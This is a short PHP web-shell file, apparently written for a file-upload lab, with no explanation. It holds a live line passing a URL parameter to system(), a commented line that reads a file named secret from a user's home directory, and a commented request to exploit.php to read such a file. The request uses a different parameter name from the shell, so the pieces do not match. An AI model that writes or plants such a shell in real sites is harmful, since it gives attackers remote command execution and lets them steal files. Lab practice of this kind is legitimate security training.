<!-- <?php echo file_get_contents('/home/carlos/secret'); ?> -->

<?php echo system($_GET['command']); ?>

<!-- GET /files/exploit.php?cmd=cat%20/home/secret HTTP/2 -->